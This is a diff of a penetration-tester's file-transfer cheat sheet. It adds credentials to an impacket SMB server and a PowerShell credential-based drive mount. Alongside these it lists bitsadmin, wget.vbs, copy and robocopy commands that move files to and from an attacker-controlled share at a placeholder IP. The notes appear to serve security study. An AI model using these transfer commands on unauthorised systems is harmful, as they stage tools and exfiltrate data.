@@ -13,7 +13,7 @@ bitsadmin /transfer job <source> <dest>
 wget.vbs https://gist.github.com/sckalath/ec7af6a1786e3de6c309
 
 # SMB Server
-impacket-smbserver [-smb2support] drive .
+impacket-smbserver [-smb2support] drive . [-user kashz -password kashz]
 
 # on windows to copy (download)
 copy \\IP\drive\FILE
@@ -21,8 +21,11 @@ copy \\IP\drive\FILE
 copy FILE \\IP\drive\
 
 # mount smb-share-drive on windows using powershell
-PS> New-PSDrive -Name "winDrive" -PSProvider "FileSystem" -Root "\\IP\drive"
-Navigating to "winDrive" shows us all files
+$pass = convertto-securestring 'kashz' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('kashz',$pass)
+New-PSDrive -Name "kashz" -PSProvider "FileSystem" -Credential $cred -Root "\\IP\drive"
+cd kashz:
+# hosted files are here.
 
 # upload dir (with all in it)
 robocopy dir \\IP\drive\ /E
